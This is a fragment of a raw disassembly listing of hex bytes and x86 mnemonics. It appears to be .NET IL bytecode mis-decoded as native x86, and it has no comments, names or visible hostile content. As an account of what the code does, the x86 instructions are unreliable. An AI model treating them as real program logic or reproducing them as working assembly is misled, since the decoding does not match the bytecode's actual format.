  4025d0:	a2 09 1f 0e 28       	mov    %al,0x280e1f09
  4025d5:	40                   	inc    %eax
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	06                   	push   %es
  4025d9:	a2 09 1f 0f 7e       	mov    %al,0x7e0f1f09
  4025de:	18 00                	sbb    %al,(%eax)
  4025e0:	00 04 28             	add    %al,(%eax,%ebp,1)
  4025e3:	11 00                	adc    %eax,(%eax)
  4025e5:	00 0a                	add    %cl,(%edx)
  4025e7:	a2 09 1f 10 28       	mov    %al,0x28101f09
  4025ec:	41                   	inc    %ecx
  4025ed:	00 00                	add    %al,(%eax)
  4025ef:	06                   	push   %es
  4025f0:	a2 09 1f 11 7e       	mov    %al,0x7e111f09
  4025f5:	18 00                	sbb    %al,(%eax)
  4025f7:	00 04 28             	add    %al,(%eax,%ebp,1)
  4025fa:	11 00                	adc    %eax,(%eax)
  4025fc:	00 0a                	add    %cl,(%edx)
  4025fe:	a2 09 1f 12 28       	mov    %al,0x28121f09
  402603:	2e 00 00             	add    %al,%cs:(%eax)
  402606:	06                   	push   %es
  402607:	8c 3c 00             	mov    %?,(%eax,%eax,1)
  40260a:	00 01                	add    %al,(%ecx)
  40260c:	a2 09 1f 13 7e       	mov    %al,0x7e131f09
  402611:	18 00                	sbb    %al,(%eax)
  402613:	00 04 28             	add    %al,(%eax,%ebp,1)
  402616:	11 00                	adc    %eax,(%eax)
  402618:	00 0a                	add    %cl,(%edx)
  40261a:	a2 09 1f 14 28       	mov    %al,0x28141f09
  40261f:	43                   	inc    %ebx
  402620:	00 00                	add    %al,(%eax)
  402622:	06                   	push   %es
  402623:	a2 09 1f 15 7e       	mov    %al,0x7e151f09
  402628:	18 00                	sbb    %al,(%eax)
  40262a:	00 04 28             	add    %al,(%eax,%ebp,1)
  40262d:	11 00                	adc    %eax,(%eax)
  40262f:	00 0a                	add    %cl,(%edx)
  402631:	a2 09 1f 16 28       	mov    %al,0x28161f09
  402636:	42                   	inc    %edx
  402637:	00 00                	add    %al,(%eax)
  402639:	06                   	push   %es
  40263a:	a2 09 28 4a 00       	mov    %al,0x4a2809
  40263f:	00 0a                	add    %cl,(%edx)
  402641:	0a 2b                	or     (%ebx),%ch
  402643:	00 06                	add    %al,(%esi)
  402645:	2a 00                	sub    (%eax),%al
  402647:	00 1b                	add    %bl,(%ebx)
  402649:	30 07                	xor    %al,(%edi)
  40264b:	00 a9 01 00 00 0f    	add    %ch,0xf000001(%ecx)
  402651:	00 00                	add    %al,(%eax)
  402653:	11 7e 0f             	adc    %edi,0xf(%esi)
  402656:	00 00                	add    %al,(%eax)
  402658:	04 2d                	add    $0x2d,%al
  40265a:	05 38 9c 01 00       	add    $0x19c38,%eax
  40265f:	00 7e 10             	add    %bh,0x10(%esi)
  402662:	00 00                	add    %al,(%eax)
  402664:	04 02                	add    $0x2,%al
  402666:	6f                   	outsl  %ds:(%esi),(%dx)
  402667:	4b                   	dec    %ebx
  402668:	00 00                	add    %al,(%eax)
  40266a:	0a 0a                	or     (%edx),%cl
  40266c:	06                   	push   %es
  40266d:	16                   	push   %ss
  40266e:	3e 3a 01             	cmp    %ds:(%ecx),%al
  402671:	00 00                	add    %al,(%eax)
  402673:	7e 11                	jle    0x402686
  402675:	00 00                	add    %al,(%eax)
  402677:	04 15                	add    $0x15,%al
  402679:	6a 40                	push   $0x40
  40267b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40267c:	00 00                	add    %al,(%eax)
  40267e:	00 7e 13             	add    %bh,0x13(%esi)
  402681:	00 00                	add    %al,(%eax)
  402683:	04 16                	add    $0x16,%al
  402685:	91                   	xchg   %eax,%ecx
  402686:	16                   	push   %ss
  402687:	40                   	inc    %eax
  402688:	83 00 00             	addl   $0x0,(%eax)
  40268b:	00 7e 14             	add    %bh,0x14(%esi)
  40268e:	00 00                	add    %al,(%eax)
  402690:	04 6f                	add    $0x6f,%al
  402692:	4c                   	dec    %esp
  402693:	00 00                	add    %al,(%eax)
  402695:	0a 28                	or     (%eax),%ch
  402697:	37                   	aaa
  402698:	00 00                	add    %al,(%eax)
  40269a:	06                   	push   %es
  40269b:	28 4d 00             	sub    %cl,0x0(%ebp)
  40269e:	00 0a                	add    %cl,(%edx)
  4026a0:	80 11 00             	adcb   $0x0,(%ecx)
  4026a3:	00 04 7e             	add    %al,(%esi,%edi,2)
  4026a6:	14 00                	adc    $0x0,%al
  4026a8:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4026ab:	4e                   	dec    %esi
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	0a 73 36             	or     0x36(%ebx),%dh
  4026b1:	00 00                	add    %al,(%eax)
  4026b3:	0a 80 14 00 00 04    	or     0x4000014(%eax),%al
  4026b9:	7e 11                	jle    0x4026cc
  4026bb:	00 00                	add    %al,(%eax)
  4026bd:	04 16                	add    $0x16,%al
  4026bf:	6a 33                	push   $0x33
  4026c1:	36 15 6a 80 11 00    	ss adc $0x11806a,%eax
  4026c7:	00 04 7e             	add    %al,(%esi,%edi,2)
  4026ca:	10 00                	adc    %al,(%eax)
  4026cc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4026cf:	13 00                	adc    (%eax),%eax
  4026d1:	00 04 16             	add    %al,(%esi,%edx,1)
  4026d4:	7e 13                	jle    0x4026e9
  4026d6:	00 00                	add    %al,(%eax)
  4026d8:	04 8e                	add    $0x8e,%al
  4026da:	b7 16                	mov    $0x16,%bh
  4026dc:	14 fe                	adc    $0xfe,%al
  4026de:	06                   	push   %es
  4026df:	1a 00                	sbb    (%eax),%al
  4026e1:	00 06                	add    %al,(%esi)
  4026e3:	73 3c                	jae    0x402721
  4026e5:	00 00                	add    %al,(%eax)
  4026e7:	0a 7e 10             	or     0x10(%esi),%bh
  4026ea:	00 00                	add    %al,(%eax)
  4026ec:	04 6f                	add    $0x6f,%al
  4026ee:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  4026f3:	dd 04 01             	fldl   (%ecx,%eax,1)
  4026f6:	00 00                	add    %al,(%eax)
  4026f8:	7e 11                	jle    0x40270b
  4026fa:	00 00                	add    %al,(%eax)
  4026fc:	04 17                	add    $0x17,%al
  4026fe:	6a da                	push   $0xffffffda
  402700:	b7 17                	mov    $0x17,%bh
  402702:	d6                   	salc
  402703:	8d 36                	lea    (%esi),%esi
  402705:	00 00                	add    %al,(%eax)
  402707:	01 80 13 00 00 04    	add    %eax,0x4000013(%eax)
  40270d:	2b 11                	sub    (%ecx),%edx
  40270f:	7e 14                	jle    0x402725
  402711:	00 00                	add    %al,(%eax)
  402713:	04 7e                	add    $0x7e,%al
  402715:	13 00                	adc    (%eax),%eax
  402717:	00 04 16             	add    %al,(%esi,%edx,1)
  40271a:	91                   	xchg   %eax,%ecx
  40271b:	6f                   	outsl  %ds:(%esi),(%dx)
  40271c:	4f                   	dec    %edi
  40271d:	00 00                	add    %al,(%eax)
  40271f:	0a 38                	or     (%eax),%bh
  402721:	86 00                	xchg   %al,(%eax)
  402723:	00 00                	add    %al,(%eax)
  402725:	7e 14                	jle    0x40273b
  402727:	00 00                	add    %al,(%eax)
  402729:	04 7e                	add    $0x7e,%al
  40272b:	13 00                	adc    (%eax),%eax
  40272d:	00 04 16             	add    %al,(%esi,%edx,1)
  402730:	06                   	push   %es
  402731:	6f                   	outsl  %ds:(%esi),(%dx)
  402732:	50                   	push   %eax
  402733:	00 00                	add    %al,(%eax)
  402735:	0a 7e 14             	or     0x14(%esi),%bh
  402738:	00 00                	add    %al,(%eax)
  40273a:	04 6f                	add    $0x6f,%al
  40273c:	51                   	push   %ecx
  40273d:	00 00                	add    %al,(%eax)
  40273f:	0a 7e 11             	or     0x11(%esi),%bh
  402742:	00 00                	add    %al,(%eax)
  402744:	04 33                	add    $0x33,%al
  402746:	44                   	inc    %esp
  402747:	14 fe                	adc    $0xfe,%al
  402749:	06                   	push   %es
  40274a:	21 00                	and    %eax,(%eax)
  40274c:	00 06                	add    %al,(%esi)
  40274e:	73 52                	jae    0x4027a2
  402750:	00 00                	add    %al,(%eax)
  402752:	0a 7e 14             	or     0x14(%esi),%bh
  402755:	00 00                	add    %al,(%eax)
  402757:	04 6f                	add    $0x6f,%al
  402759:	4c                   	dec    %esp
  40275a:	00 00                	add    %al,(%eax)
  40275c:	0a 28                	or     (%eax),%ch
  40275e:	53                   	push   %ebx
  40275f:	00 00                	add    %al,(%eax)
  402761:	0a 26                	or     (%esi),%ah
  402763:	15 6a 80 11 00       	adc    $0x11806a,%eax
  402768:	00 04 7e             	add    %al,(%esi,%edi,2)
  40276b:	14 00                	adc    $0x0,%al
  40276d:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402770:	4e                   	dec    %esi
  402771:	00 00                	add    %al,(%eax)
  402773:	0a 73 36             	or     0x36(%ebx),%dh
  402776:	00 00                	add    %al,(%eax)
  402778:	0a 80 14 00 00 04    	or     0x4000014(%eax),%al
  40277e:	17                   	pop    %ss
  40277f:	8d 36                	lea    (%esi),%esi
  402781:	00 00                	add    %al,(%eax)
  402783:	01 80 13 00 00 04    	add    %eax,0x4000013(%eax)
  402789:	2b 20                	sub    (%eax),%esp
  40278b:	7e 11                	jle    0x40279e
  40278d:	00 00                	add    %al,(%eax)
  40278f:	04 7e                	add    $0x7e,%al
  402791:	14 00                	adc    $0x0,%al
  402793:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402796:	51                   	push   %ecx
  402797:	00 00                	add    %al,(%eax)
  402799:	0a da                	or     %dl,%bl
  40279b:	17                   	pop    %ss
  40279c:	6a da                	push   $0xffffffda
  40279e:	b7 17                	mov    $0x17,%bh
  4027a0:	d6                   	salc
  4027a1:	8d 36                	lea    (%esi),%esi
  4027a3:	00 00                	add    %al,(%eax)
  4027a5:	01 80 13 00 00 04    	add    %eax,0x4000013(%eax)
  4027ab:	2b 08                	sub    (%eax),%ecx
  4027ad:	16                   	push   %ss
  4027ae:	80 0f 00             	orb    $0x0,(%edi)
  4027b1:	00 04 de             	add    %al,(%esi,%ebx,8)
  4027b4:	47                   	inc    %edi
  4027b5:	7e 10                	jle    0x4027c7
  4027b7:	00 00                	add    %al,(%eax)
  4027b9:	04 7e                	add    $0x7e,%al
  4027bb:	13 00                	adc    (%eax),%eax
  4027bd:	00 04 16             	add    %al,(%esi,%edx,1)
  4027c0:	7e 13                	jle    0x4027d5
  4027c2:	00 00                	add    %al,(%eax)
  4027c4:	04 8e                	add    $0x8e,%al
  4027c6:	b7 16                	mov    $0x16,%bh
  4027c8:	14 fe                	adc    $0xfe,%al
  4027ca:	06                   	push   %es
  4027cb:	1a 00                	sbb    (%eax),%al
  4027cd:	00 06                	add    %al,(%esi)
  4027cf:	73 3c                	jae    0x40280d
  4027d1:	00 00                	add    %al,(%eax)
  4027d3:	0a 7e 10             	or     0x10(%esi),%bh
  4027d6:	00 00                	add    %al,(%eax)
  4027d8:	04 6f                	add    $0x6f,%al
  4027da:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  4027df:	de 1b                	ficomps (%ebx)
  4027e1:	25 28 29 00 00       	and    $0x2928,%eax
  4027e6:	0a 0b                	or     (%ebx),%cl
  4027e8:	16                   	push   %ss
  4027e9:	80 0f 00             	orb    $0x0,(%edi)
  4027ec:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027ef:	2a 00                	sub    (%eax),%al
  4027f1:	00 0a                	add    %cl,(%edx)
  4027f3:	de 07                	fiadds (%edi)
  4027f5:	28 2a                	sub    %ch,(%edx)
  4027f7:	00 00                	add    %al,(%eax)
  4027f9:	0a de                	or     %dh,%bl
  4027fb:	00 2a                	add    %ch,(%edx)
  4027fd:	00 00                	add    %al,(%eax)
  4027ff:	00 41 1c             	add    %al,0x1c(%ecx)
  402802:	00 00                	add    %al,(%eax)
  402804:	00 00                	add    %al,(%eax)
  402806:	00 00                	add    %al,(%eax)
  402808:	0c 00                	or     $0x0,%al
  40280a:	00 00                	add    %al,(%eax)
  40280c:	81 01 00 00 8d 01    	addl   $0x18d0000,(%ecx)
  402812:	00 00                	add    %al,(%eax)
  402814:	1b 00                	sbb    (%eax),%eax
  402816:	00 00                	add    %al,(%eax)
  402818:	24 00                	and    $0x0,%al
  40281a:	00 01                	add    %al,(%ecx)
  40281c:	1b 30                	sbb    (%eax),%esi
  40281e:	02 00                	add    (%eax),%al
  402820:	17                   	pop    %ss
  402821:	00 00                	add    %al,(%eax)
  402823:	00 10                	add    %dl,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	11 02                	adc    %eax,(%edx)
  402829:	28 29                	sub    %ch,(%ecx)
  40282b:	00 00                	add    %al,(%eax)
  40282d:	06                   	push   %es
  40282e:	de 0e                	fimuls (%esi)
  402830:	25 28 29 00 00       	and    $0x2928,%eax
  402835:	0a 0a                	or     (%edx),%cl
  402837:	28 2a                	sub    %ch,(%edx)
  402839:	00 00                	add    %al,(%eax)
  40283b:	0a de                	or     %dh,%bl
  40283d:	00 2a                	add    %ch,(%edx)
  40283f:	00 01                	add    %al,(%ecx)
  402841:	10 00                	adc    %al,(%eax)
  402843:	00 00                	add    %al,(%eax)
  402845:	00 00                	add    %al,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	08 00                	or     %al,(%eax)
  40284b:	0e                   	push   %cs
  40284c:	24 00                	and    $0x0,%al
  40284e:	00 01                	add    %al,(%ecx)
  402850:	1b 30                	sbb    (%eax),%esi
  402852:	07                   	pop    %es
  402853:	00 c9                	add    %cl,%cl
  402855:	00 00                	add    %al,(%eax)
  402857:	00 11                	add    %dl,(%ecx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 17             	adc    %edi,0x17(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 13                	add    $0x13,%al
  402862:	04 11                	add    $0x11,%al
  402864:	04 28                	add    $0x28,%al
  402866:	54                   	push   %esp
  402867:	00 00                	add    %al,(%eax)
  402869:	0a 16                	or     (%esi),%dl
  40286b:	13 05 11 04 12 05    	adc    0x5120411,%eax
  402871:	28 55 00             	sub    %dl,0x0(%ebp)
  402874:	00 0a                	add    %cl,(%edx)
  402876:	7e 0f                	jle    0x402887
  402878:	00 00                	add    %al,(%eax)
  40287a:	04 39                	add    $0x39,%al
  40287c:	96                   	xchg   %eax,%esi
  40287d:	00 00                	add    %al,(%eax)
  40287f:	00 73 36             	add    %dh,0x36(%ebx)
  402882:	00 00                	add    %al,(%eax)
  402884:	0a 0a                	or     (%edx),%cl
  402886:	02 28                	add    (%eax),%ch
  402888:	36 00 00             	add    %al,%ss:(%eax)
  40288b:	06                   	push   %es
  40288c:	28 3d 00 00 06 0b    	sub    %bh,0xb060000
  402892:	07                   	pop    %es
  402893:	8e b7 28 56 00 00    	mov    0x5628(%edi),%?
  402899:	0a 72 0f             	or     0xf(%edx),%dh
  40289c:	01 00                	add    %eax,(%eax)
  40289e:	70 28                	jo     0x4028c8
  4028a0:	47                   	inc    %edi
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	0a 28                	or     (%eax),%ch
  4028a5:	36 00 00             	add    %al,%ss:(%eax)
  4028a8:	06                   	push   %es
  4028a9:	0c 06                	or     $0x6,%al
  4028ab:	08 16                	or     %dl,(%esi)
  4028ad:	08 8e b7 6f 50 00    	or     %cl,0x506fb7(%esi)
  4028b3:	00 0a                	add    %cl,(%edx)
  4028b5:	06                   	push   %es
  4028b6:	07                   	pop    %es
  4028b7:	16                   	push   %ss
  4028b8:	07                   	pop    %es
  4028b9:	8e b7 6f 50 00 00    	mov    0x506f(%edi),%?
  4028bf:	0a 7e 10             	or     0x10(%esi),%bh
  4028c2:	00 00                	add    %al,(%eax)
  4028c4:	04 15                	add    $0x15,%al
  4028c6:	17                   	pop    %ss
  4028c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4028c8:	57                   	push   %edi
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	0a 26                	or     (%esi),%ah
  4028cd:	7e 10                	jle    0x4028df
  4028cf:	00 00                	add    %al,(%eax)
  4028d1:	04 06                	add    $0x6,%al
  4028d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4028d4:	4c                   	dec    %esp
  4028d5:	00 00                	add    %al,(%eax)
  4028d7:	0a 16                	or     (%esi),%dl
  4028d9:	06                   	push   %es
  4028da:	6f                   	outsl  %ds:(%esi),(%dx)
  4028db:	51                   	push   %ecx
  4028dc:	00 00                	add    %al,(%eax)
  4028de:	0a b7 16 14 fe 06    	or     0x6fe1416(%edi),%dh
  4028e4:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  4028e9:	3c 00                	cmp    $0x0,%al
  4028eb:	00 0a                	add    %cl,(%edx)
  4028ed:	14 6f                	adc    $0x6f,%al
  4028ef:	58                   	pop    %eax
  4028f0:	00 00                	add    %al,(%eax)
  4028f2:	0a 26                	or     (%esi),%ah
  4028f4:	de 0a                	fimuls (%edx)
  4028f6:	06                   	push   %es
  4028f7:	2c 06                	sub    $0x6,%al
  4028f9:	06                   	push   %es
  4028fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4028fb:	59                   	pop    %ecx
  4028fc:	00 00                	add    %al,(%eax)
  4028fe:	0a dc                	or     %ah,%bl
  402900:	de 14 25 28 29 00 00 	ficoms 0x2928(,%eiz,1)
  402907:	0a 0d 16 80 0f 00    	or     0xf8016,%cl
  40290d:	00 04 28             	add    %al,(%eax,%ebp,1)
  402910:	2a 00                	sub    (%eax),%al
  402912:	00 0a                	add    %cl,(%edx)
  402914:	de 00                	fiadds (%eax)
  402916:	de 0c 11             	fimuls (%ecx,%edx,1)
  402919:	05 2c 07 11 04       	add    $0x411072c,%eax
  40291e:	28 5a 00             	sub    %bl,0x0(%edx)
  402921:	00 0a                	add    %cl,(%edx)
  402923:	dc 2a                	fsubrl (%edx)
  402925:	00 00                	add    %al,(%eax)
  402927:	00 01                	add    %al,(%ecx)
  402929:	28 00                	sub    %al,(%eax)
  40292b:	00 02                	add    %al,(%edx)
  40292d:	00 2a                	add    %ch,(%edx)
  40292f:	00 70 9a             	add    %dh,-0x66(%eax)
  402932:	00 0a                	add    %cl,(%edx)
  402934:	00 00                	add    %al,(%eax)
  402936:	00 00                	add    %al,(%eax)
  402938:	00 00                	add    %al,(%eax)
  40293a:	24 00                	and    $0x0,%al
  40293c:	82 a6 00 14 24 00 00 	andb   $0x0,0x241400(%esi)
  402943:	01 02                	add    %eax,(%edx)
  402945:	00 11                	add    %dl,(%ecx)
  402947:	00 ab bc 00 0c 00    	add    %ch,0xc00bc(%ebx)
  40294d:	00 00                	add    %al,(%eax)
  40294f:	00 1b                	add    %bl,(%ebx)
  402951:	30 02                	xor    %al,(%edx)
  402953:	00 23                	add    %ah,(%ebx)
  402955:	00 00                	add    %al,(%eax)
  402957:	00 12                	add    %dl,(%edx)
  402959:	00 00                	add    %al,(%eax)
  40295b:	11 7e 10             	adc    %edi,0x10(%esi)
  40295e:	00 00                	add    %al,(%eax)
  402960:	04 02                	add    $0x2,%al
  402962:	6f                   	outsl  %ds:(%esi),(%dx)
  402963:	5b                   	pop    %ebx
  402964:	00 00                	add    %al,(%eax)
  402966:	0a 26                	or     (%esi),%ah
  402968:	de 14 25 28 29 00 00 	ficoms 0x2928(,%eiz,1)
  40296f:	0a 0a                	or     (%edx),%cl
  402971:	16                   	push   %ss
  402972:	80 0f 00             	orb    $0x0,(%edi)
  402975:	00 04 28             	add    %al,(%eax,%ebp,1)
  402978:	2a 00                	sub    (%eax),%al
  40297a:	00 0a                	add    %cl,(%edx)
  40297c:	de 00                	fiadds (%eax)
  40297e:	2a 00                	sub    (%eax),%al
  402980:	01 10                	add    %edx,(%eax)
  402982:	00 00                	add    %al,(%eax)
  402984:	00 00                	add    %al,(%eax)
  402986:	00 00                	add    %al,(%eax)
  402988:	0e                   	push   %cs
  402989:	0e                   	push   %cs
  40298a:	00 14 24             	add    %dl,(%esp)
  40298d:	00 00                	add    %al,(%eax)
  40298f:	01 1b                	add    %ebx,(%ebx)
  402991:	30 02                	xor    %al,(%edx)
  402993:	00 8f 00 00 00 13    	add    %cl,0x13000000(%edi)
  402999:	00 00                	add    %al,(%eax)
  40299b:	11 7e 15             	adc    %edi,0x15(%esi)
  40299e:	00 00                	add    %al,(%eax)
  4029a0:	04 2c                	add    $0x2c,%al
  4029a2:	20 7e 15             	and    %bh,0x15(%esi)
  4029a5:	00 00                	add    %al,(%eax)
  4029a7:	04 6f                	add    $0x6f,%al
  4029a9:	5c                   	pop    %esp
  4029aa:	00 00                	add    %al,(%eax)
  4029ac:	0a 14 80             	or     (%eax,%eax,4),%dl
  4029af:	15 00 00 04 de       	adc    $0xde040000,%eax
  4029b4:	0e                   	push   %cs
  4029b5:	25 28 29 00 00       	and    $0x2928,%eax
  4029ba:	0a 0a                	or     (%edx),%cl
  4029bc:	28 2a                	sub    %ch,(%edx)
  4029be:	00 00                	add    %al,(%eax)
  4029c0:	0a de                	or     %dh,%bl
  4029c2:	00 7e 14             	add    %bh,0x14(%esi)
  4029c5:	00 00                	add    %al,(%eax)
  4029c7:	04 2c                	add    $0x2c,%al
  4029c9:	2a 7e 14             	sub    0x14(%esi),%bh
  4029cc:	00 00                	add    %al,(%eax)
  4029ce:	04 6f                	add    $0x6f,%al
  4029d0:	5d                   	pop    %ebp
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	0a 7e 14             	or     0x14(%esi),%bh
  4029d6:	00 00                	add    %al,(%eax)
  4029d8:	04 6f                	add    $0x6f,%al
  4029da:	4e                   	dec    %esi
  4029db:	00 00                	add    %al,(%eax)
  4029dd:	0a 14 80             	or     (%eax,%eax,4),%dl
  4029e0:	14 00                	adc    $0x0,%al
  4029e2:	00 04 de             	add    %al,(%esi,%ebx,8)
  4029e5:	0e                   	push   %cs
  4029e6:	25 28 29 00 00       	and    $0x2928,%eax
  4029eb:	0a 0b                	or     (%ebx),%cl
  4029ed:	28 2a                	sub    %ch,(%edx)
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	0a de                	or     %dh,%bl
  4029f3:	00 7e 10             	add    %bh,0x10(%esi)
  4029f6:	00 00                	add    %al,(%eax)
  4029f8:	04 2c                	add    $0x2c,%al
  4029fa:	2a 7e 10             	sub    0x10(%esi),%bh
  4029fd:	00 00                	add    %al,(%eax)
  4029ff:	04 6f                	add    $0x6f,%al
  402a01:	5e                   	pop    %esi
  402a02:	00 00                	add    %al,(%eax)
  402a04:	0a 7e 10             	or     0x10(%esi),%bh
  402a07:	00 00                	add    %al,(%eax)
  402a09:	04 6f                	add    $0x6f,%al
  402a0b:	5f                   	pop    %edi
  402a0c:	00 00                	add    %al,(%eax)
  402a0e:	0a 14 80             	or     (%eax,%eax,4),%dl
  402a11:	10 00                	adc    %al,(%eax)
  402a13:	00 04 de             	add    %al,(%esi,%ebx,8)
  402a16:	0e                   	push   %cs
  402a17:	25 28 29 00 00       	and    $0x2928,%eax
  402a1c:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  402a1f:	2a 00                	sub    (%eax),%al
  402a21:	00 0a                	add    %cl,(%edx)
  402a23:	de 00                	fiadds (%eax)
  402a25:	28 60 00             	sub    %ah,0x0(%eax)
  402a28:	00 0a                	add    %cl,(%edx)
  402a2a:	2a 00                	sub    (%eax),%al
  402a2c:	01 28                	add    %ebp,(%eax)
  402a2e:	00 00                	add    %al,(%eax)
  402a30:	00 00                	add    %al,(%eax)
  402a32:	07                   	pop    %es
  402a33:	00 12                	add    %dl,(%edx)
  402a35:	19 00                	sbb    %eax,(%eax)
  402a37:	0e                   	push   %cs
  402a38:	24 00                	and    $0x0,%al
  402a3a:	00 01                	add    %al,(%ecx)
  402a3c:	00 00                	add    %al,(%eax)
  402a3e:	2e 00 1c 4a          	add    %bl,%cs:(%edx,%ecx,2)
  402a42:	00 0e                	add    %cl,(%esi)
  402a44:	24 00                	and    $0x0,%al
  402a46:	00 01                	add    %al,(%ecx)
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	5f                   	pop    %edi
  402a4b:	00 1c 7b             	add    %bl,(%ebx,%edi,2)
  402a4e:	00 0e                	add    %cl,(%esi)
  402a50:	24 00                	and    $0x0,%al
  402a52:	00 01                	add    %al,(%ecx)
  402a54:	1b 30                	sbb    (%eax),%esi
  402a56:	02 00                	add    (%eax),%al
  402a58:	27                   	daa
  402a59:	00 00                	add    %al,(%eax)
  402a5b:	00 14 00             	add    %dl,(%eax,%eax,1)
  402a5e:	00 11                	add    %dl,(%ecx)
  402a60:	7e 0f                	jle    0x402a71
  402a62:	00 00                	add    %al,(%eax)
  402a64:	04 2c                	add    $0x2c,%al
  402a66:	0f 72                	psrld  $0x72,(bad)
  402a68:	13 01                	adc    (%ecx),%eax
  402a6a:	00 70 28             	add    %dh,0x28(%eax)
  402a6d:	1c 00                	sbb    $0x0,%al
  402a6f:	00 06                	add    %al,(%esi)
  402a71:	28 60 00             	sub    %ah,0x0(%eax)
  402a74:	00 0a                	add    %cl,(%edx)
  402a76:	de 0e                	fimuls (%esi)
  402a78:	25 28 29 00 00       	and    $0x2928,%eax
  402a7d:	0a 0a                	or     (%edx),%cl
  402a7f:	28 2a                	sub    %ch,(%edx)
  402a81:	00 00                	add    %al,(%eax)
  402a83:	0a de                	or     %dh,%bl
  402a85:	00 2a                	add    %ch,(%edx)
  402a87:	00 01                	add    %al,(%ecx)
  402a89:	10 00                	adc    %al,(%eax)
  402a8b:	00 00                	add    %al,(%eax)
  402a8d:	00 00                	add    %al,(%eax)
  402a8f:	00 18                	add    %bl,(%eax)
  402a91:	18 00                	sbb    %al,(%eax)
  402a93:	0e                   	push   %cs
  402a94:	24 00                	and    $0x0,%al
  402a96:	00 01                	add    %al,(%ecx)
  402a98:	22 28                	and    (%eax),%ch
  402a9a:	1f                   	pop    %ds
  402a9b:	00 00                	add    %al,(%eax)
  402a9d:	06                   	push   %es
  402a9e:	2b 00                	sub    (%eax),%eax
  402aa0:	2a 00                	sub    (%eax),%al
  402aa2:	00 00                	add    %al,(%eax)
  402aa4:	3a 02                	cmp    (%edx),%al
  402aa6:	74 09                	je     0x402ab1
  402aa8:	00 00                	add    %al,(%eax)
  402aaa:	1b 28                	sbb    (%eax),%ebp
  402aac:	1b 00                	sbb    (%eax),%eax
  402aae:	00 06                	add    %al,(%esi)
  402ab0:	2b 00                	sub    (%eax),%eax
  402ab2:	2a 00                	sub    (%eax),%al
  402ab4:	42                   	inc    %edx
  402ab5:	7e 18                	jle    0x402acf
  402ab7:	00 00                	add    %al,(%eax)
  402ab9:	04 28                	add    $0x28,%al
  402abb:	11 00                	adc    %eax,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	80 19 00             	sbbb   $0x0,(%ecx)
  402ac2:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402ac5:	00 00                	add    %al,(%eax)
  402ac7:	00 1e                	add    %bl,(%esi)
  402ac9:	02 28                	add    (%eax),%ch
  402acb:	17                   	pop    %ss
  402acc:	00 00                	add    %al,(%eax)
  402ace:	0a 2a                	or     (%edx),%ch
  402ad0:	13 30                	adc    (%eax),%esi
  402ad2:	01 00                	add    %eax,(%eax)
  402ad4:	0a 00                	or     (%eax),%al
  402ad6:	00 00                	add    %al,(%eax)
  402ad8:	15 00 00 11 7e       	adc    $0x7e110000,%eax
  402add:	1a 00                	sbb    (%eax),%al
  402adf:	00 04 0a             	add    %al,(%edx,%ecx,1)
  402ae2:	2b 00                	sub    (%eax),%eax
  402ae4:	06                   	push   %es
  402ae5:	2a 00                	sub    (%eax),%al
  402ae7:	00 13                	add    %dl,(%ebx)
  402ae9:	30 02                	xor    %al,(%edx)
  402aeb:	00 5b 00             	add    %bl,0x0(%ebx)
  402aee:	00 00                	add    %al,(%eax)
  402af0:	16                   	push   %ss
  402af1:	00 00                	add    %al,(%eax)
  402af3:	11 14 fe             	adc    %edx,(%esi,%edi,8)
  402af6:	06                   	push   %es
  402af7:	28 00                	sub    %al,(%eax)
  402af9:	00 06                	add    %al,(%esi)
  402afb:	73 61                	jae    0x402b5e
  402afd:	00 00                	add    %al,(%eax)
  402aff:	0a 0a                	or     (%edx),%cl
  402b01:	14 fe                	adc    $0xfe,%al
  402b03:	06                   	push   %es
  402b04:	27                   	daa
  402b05:	00 00                	add    %al,(%eax)
  402b07:	06                   	push   %es
  402b08:	73 61                	jae    0x402b6b
  402b0a:	00 00                	add    %al,(%eax)
  402b0c:	0a 0b                	or     (%ebx),%cl
  402b0e:	7e 1a                	jle    0x402b2a
  402b10:	00 00                	add    %al,(%eax)
  402b12:	04 2c                	add    $0x2c,%al
  402b14:	16                   	push   %ss
  402b15:	7e 1a                	jle    0x402b31
  402b17:	00 00                	add    %al,(%eax)
  402b19:	04 06                	add    $0x6,%al
  402b1b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b1c:	62 00                	bound  %eax,(%eax)
  402b1e:	00 0a                	add    %cl,(%edx)
  402b20:	7e 1a                	jle    0x402b3c
  402b22:	00 00                	add    %al,(%eax)
  402b24:	04 07                	add    $0x7,%al
  402b26:	6f                   	outsl  %ds:(%esi),(%dx)
  402b27:	63 00                	arpl   %eax,(%eax)
  402b29:	00 0a                	add    %cl,(%edx)
  402b2b:	02 80 1a 00 00 04    	add    0x400001a(%eax),%al
  402b31:	7e 1a                	jle    0x402b4d
  402b33:	00 00                	add    %al,(%eax)
  402b35:	04 2c                	add    $0x2c,%al
  402b37:	16                   	push   %ss
  402b38:	7e 1a                	jle    0x402b54
  402b3a:	00 00                	add    %al,(%eax)
  402b3c:	04 06                	add    $0x6,%al
  402b3e:	6f                   	outsl  %ds:(%esi),(%dx)
  402b3f:	64 00 00             	add    %al,%fs:(%eax)
  402b42:	0a 7e 1a             	or     0x1a(%esi),%bh
